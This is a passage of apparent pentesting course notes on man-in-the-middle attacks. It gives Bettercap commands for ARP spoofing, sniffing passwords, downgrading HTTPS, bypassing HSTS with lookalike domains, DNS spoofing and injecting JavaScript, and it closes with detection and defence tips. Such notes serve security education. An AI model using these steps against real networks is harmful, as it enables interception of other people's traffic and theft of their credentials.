<h3>ARP Spoofing using Bettercap<a class="headerlink" href="#arp-spoofing-using-bettercap" title="Permalink to this heading"></a></h3>
<div class="highlight-bash notranslate"><div class="highlight"><pre><span></span><span class="nb">set</span> arp.spoof.fullduplex <span class="nb">true</span>
<span class="nb">set</span> arp.spoof.targets <span class="m">10</span>.0.2.7
arp.spoof on
</pre></div>
</div>
</section>
<section id="spying-on-network-devices-capturing-passwords-etc">
<h3>Spying on Network Devices (Capturing Passwords, etc.)<a class="headerlink" href="#spying-on-network-devices-capturing-passwords-etc" title="Permalink to this heading"></a></h3>
<div class="highlight-bash notranslate"><div class="highlight"><pre><span></span>net.sniff on
<span class="c1"># go to http://vulnweb.com on the target</span>
</pre></div>
</div>
</section>
<section id="creating-custom-spoofing-script">
<h3>Creating Custom Spoofing Script<a class="headerlink" href="#creating-custom-spoofing-script" title="Permalink to this heading"></a></h3>
<div class="highlight-bash notranslate"><div class="highlight"><pre><span></span>bettercap -iface eth0 -caplet spoof.cap
</pre></div>
</div>
</section>
<section id="bypass-https">
<h3>Bypass HTTPS<a class="headerlink" href="#bypass-https" title="Permalink to this heading"></a></h3>
<p>Problem:</p>
<ul class="simple">
<li><p>Data in HTTP is sent as plain text</p></li>
<li><p>A MITM can read and edit requests and responses</p></li>
<li><p>Not secure</p></li>
</ul>
<p>Solution:</p>
<ul class="simple">
<li><p>Use HTTPS</p></li>
<li><p>HTTPS is an adaptation of HTTP</p></li>
<li><p>Encrypt HTTP using TLS or SSL</p></li>
</ul>
<p>Problem:</p>
<ul class="simple">
<li><p>Most websites use HTTPS</p></li>
<li><p>Data sniffed will be encrypted</p></li>
</ul>
<p>Solution:</p>
<ul class="simple">
<li><p>Downgrade HTTPS to HTTP</p></li>
</ul>
<div class="highlight-bash notranslate"><div class="highlight"><pre><span></span>hstshijack/hstshijack
</pre></div>
</div>
</section>
<section id="bypassing-hsts">
<h3>Bypassing HSTS<a class="headerlink" href="#bypassing-hsts" title="Permalink to this heading"></a></h3>
<p>HSTS</p>
<ul class="simple">
<li><p>HTTP Strict Transport Security</p></li>
<li><p>Used by Facebook, Twitter and few other famous websites</p></li>
</ul>
<p>Problem:</p>
<ul class="simple">
<li><p>Modern browsers are hard-coded to only load a list of HSTS websites over https</p></li>
</ul>
<p>Solution:</p>
<ul class="simple">
<li><p>Trick the browser into loading a different website</p></li>
<li><p>Replace all links for HSTS websites with similar links</p></li>
</ul>
<p>Ex.</p>
<ul class="simple">
<li><p>facebook.com -&gt; facebook.corn</p></li>
<li><p>twitter.com -&gt; twiter.com</p></li>
</ul>
<div class="highlight-bash notranslate"><div class="highlight"><pre><span></span><span class="c1"># modify the hstshijack.cap file</span>
</pre></div>
</div>
</section>
<section id="bypassing-hsts-recap">
<h3>Bypassing HSTS Recap<a class="headerlink" href="#bypassing-hsts-recap" title="Permalink to this heading"></a></h3>
<table class="docutils align-default">
<colgroup>
<col style="width: 9%" />
<col style="width: 36%" />
<col style="width: 22%" />
<col style="width: 5%" />
<col style="width: 28%" />
</colgroup>
<thead>
<tr class="row-odd"><th class="head"></th>
<th class="head"><p>Examples</p></th>
<th class="head"><p>Hacker Setup</p></th>
<th class="head"><p>Firefox</p></th>
<th class="head"><p>Chrome</p></th>
</tr>
</thead>
<tbody>
<tr class="row-even"><td><p>HTTP
HTTPS
Preloaded HSTS</p></td>
<td><p>vulnweb.com
linkedin.com, winzip.com, stackoverflow.com, google.ie, netflix.com
twitter.com, facebook.com, github.com</p></td>
<td><p>Bettercap
zSec custom Kali + Bettercap + HSTShijack
zSec custom Kali + Bettercap + HSTShijack</p></td>
<td><p>X
X
X</p></td>
<td><p>X
Website needs to be included in the HSTSHijack caplet
Works if Secure DNS is disabled</p></td>
</tr>
</tbody>
</table>
</section>
<section id="dns-spoofing">
<h3>DNS Spoofing<a class="headerlink" href="#dns-spoofing" title="Permalink to this heading"></a></h3>
<div class="highlight-bash notranslate"><div class="highlight"><pre><span></span>bettercap -iface eth0 -caplet /root/spoof.cap
<span class="nb">set</span> dns.spoof.all <span class="nb">true</span>
<span class="nb">set</span> dns.spoof.domains zsecurity.org,*.zsecurity.org
dns.spoof on
</pre></div>
</div>
</section>
<section id="injecting-javascript-code">
<h3>Injecting Javascript Code<a class="headerlink" href="#injecting-javascript-code" title="Permalink to this heading"></a></h3>
<p><strong>Bettercap Code Injection</strong></p>
<ul>
<li><p>Inject Javascript code in loaded pages</p></li>
<li><p>Code gets executed</p></li>
<li><p>This can be used to</p>
<blockquote>
<div><ul class="simple">
<li><p>Replace links</p></li>
<li><p>Replace images</p></li>
<li><p>Insert html elements</p></li>
<li><p>Hook target browser to exploitation frameworks</p></li>
<li><p>and more</p></li>
</ul>
</div></blockquote>
</li>
</ul>
</section>
<section id="bettercap-web-interface">
<h3>Bettercap Web Interface<a class="headerlink" href="#bettercap-web-interface" title="Permalink to this heading"></a></h3>
<ul>
<li><p>Web interface</p>
<blockquote>
<div><ul class="simple">
<li><p>More user-friendly</p></li>
<li><p>Requires more resources</p></li>
<li><p>And more modules</p></li>
</ul>
</div></blockquote>
</li>
</ul>
<div class="highlight-bash notranslate"><div class="highlight"><pre><span></span>bettercap -iface eth0
ui.update
http-ui

<span class="c1"># credentials</span>
user, pass
</pre></div>
</div>
</section>
<section id="wireshark">
<h3>Wireshark<a class="headerlink" href="#wireshark" title="Permalink to this heading"></a></h3>
<ul>
<li><p>Wireshark is a network protocol analyser</p></li>
<li><p>Designed to help network administrators to keep track of whats happening in their network</p></li>
<li><p>How it works</p>
<blockquote>
<div><ul class="simple">
<li><p>Logs packets taht flow through selected interface</p></li>
<li><p>Analyse all the packets</p></li>
</ul>
</div></blockquote>
</li>
<li><p>WHen we are the MITM, wireshark can be used to sniff and analyse traffic sent/received by targets</p></li>
</ul>
</section>
</section>
<section id="detection-security">
<h2>Detection &amp; Security<a class="headerlink" href="#detection-security" title="Permalink to this heading"></a></h2>
<section id="arp-spoofing">
<h3>ARP Spoofing<a class="headerlink" href="#arp-spoofing" title="Permalink to this heading"></a></h3>
<p>Why ARP Spoofing is possible:</p>
<ol class="arabic simple">
<li><p>clients accept responses even if they did not send a request</p></li>
<li><p>Clients trust response without any form of verification</p></li>
<li><p>Use xarp on Windows and Linux to detect arp poisoning</p></li>
</ol>
</section>
<section id="mitm-attacks">
<h3>MITM Attacks<a class="headerlink" href="#mitm-attacks" title="Permalink to this heading"></a></h3>
<p>Detection:</p>
<ol class="arabic simple">
<li><p>Analysing arp tables</p></li>
<li><p>Using tools such as Xarp</p></li>
<li><p>Using wireshark</p></li>
</ol>
<p>Problems:</p>
<ol class="arabic simple">
<li><p>Detection is not the same as prevention</p></li>
<li><p>Only works for ARP Spoofing.</p></li>
</ol>
<p>Solution:</p>
<ul class="simple">
<li><p>Encrypt traffic</p></li>
<li><p>HTTPS everywhere plugin</p></li>
<li><p>Using a VPN</p></li>
</ul>
<p>Benefits of VPN:</p>
<ul class="simple">
<li><p>Extra layer of encryption</p></li>
<li><p>More privacy &amp; anonymity</p></li>
<li><p>Bypass censorship</p></li>
<li><p>Protection from hackers</p></li>
</ul>
<p>Notes:</p>
<ul class="simple">
<li><p>Use reputable VPN</p></li>
<li><p>Avoid free providers</p></li>
<li><p>Make sure they keep no logs</p></li>
<li><p>Use HTTPS everywhere</p></li>
</ul>
</section>
</section>
</section>


           </div>
          </div>
          <footer><div class="rst-footer-buttons" role="navigation" aria-label="Footer">
        <a href="index.html" class="btn btn-neutral float-left" title="Pentesting" accesskey="p" rel="prev"><span class="fa fa-arrow-circle-left" aria-hidden="true"></span> Previous</a>
        <a href="website-hacking.html" class="btn btn-neutral float-right" title="Website Hacking" accesskey="n" rel="next">Next <span class="fa fa-arrow-circle-right" aria-hidden="true"></span></a>
    </div>

  <hr/>

  <div role="contentinfo">
    <p>&#169; Copyright 2021, Caleb Sargeant.</p>
  </div>

  Built with <a href="https://www.sphinx-doc.org/">Sphinx</a> using a
    <a href="https://github.com/readthedocs/sphinx_rtd_theme">theme</a>
    provided by <a href="https://readthedocs.org">Read the Docs</a>.
   

</footer>
        </div>
      </div>
    </section>
  </div>
  <script>
      jQuery(function () {
          SphinxRtdTheme.Navigation.enable(true);
      });
  </script> 

</body>
</html>